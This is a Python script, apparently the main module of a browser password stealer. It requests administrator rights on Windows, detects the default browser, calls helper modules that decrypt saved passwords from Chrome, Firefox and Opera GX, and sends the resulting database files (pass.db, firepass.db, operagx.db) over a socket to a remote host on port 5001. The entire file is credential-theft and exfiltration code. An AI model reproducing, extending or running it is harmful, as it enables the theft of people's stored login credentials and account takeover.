import os
import sys
import xml.etree.ElementTree as ET
import time
import sockets.client as client
import glob
from platform import system

system = system()

if system == "Windows":
    import win32com.shell.shell as shell
else:
    pass

def admin():
    if system == "Windows":
        if sys.argv[-1] != 'asadmin':
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:] + ['asadmin'])
            shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
        else:
            pass
    elif system == "Linux":
        os.system('xdg-mime query default x-scheme-handler/http > browser.txt')

def detect_browser():
    if system == "Windows":
        os.system('dism /online /Export-DefaultAppAssociations:"%UserProfile%\Desktop\FileAssociations.xml"')
        time.sleep(5)
        root = ET.parse("C:" + os.getenv('HOMEPATH') + r'\Desktop\FileAssociations.xml').getroot()
        for type_tag in root:
            value = type_tag.get('Identifier')
            if value == "https":
                browser = type_tag.get("ApplicationName")
                os.remove("C:" + os.getenv('HOMEPATH') + r'\Desktop\FileAssociations.xml')
                return browser

    elif system == "Linux":
        with open('browser.txt', 'r') as f:
            browser = f.read()
            os.remove('browser.txt')
            return browser
    
def run_wizard(browser):

    if system == "Windows":
        from browser_windows.win_operagx import windows_opera
        from browser_windows.win_chrome import windows
        import browser_windows.win_firefox as win_firefox

        NSS = win_firefox.NSSDecoder()

        if "Opera" in browser:
            windows_opera()
        elif "Chrome" in browser:
            windows()
        elif "Firefox" in browser:
            win_firefox.decrypt_passwords()
        else:
            print("The browser is not supported")

    elif system == "Linux":
        from browsers_linux.linux_chrome import main
        import browsers_linux.linux_firefox as linux_firefox

        NSS = linux_firefox.NSSDecoder()

        if 'Firefox' or 'firefox' in browser:
            linux_firefox.decrypt_passwords()
        elif 'chrome' or 'Chrome' in browser:
            main()
        else:
            print('the browser is not supported')


if __name__ == '__main__':
    admin()
    browser = detect_browser()
    run_wizard(browser)
    filename = ["pass.db", "firepass.db", "operagx.db"]
    host = ""
    port = 5001
    for files in filename:
        if files in glob.glob('*.db'):
            client.send_file(files, host, port)
        else:
            pass
        
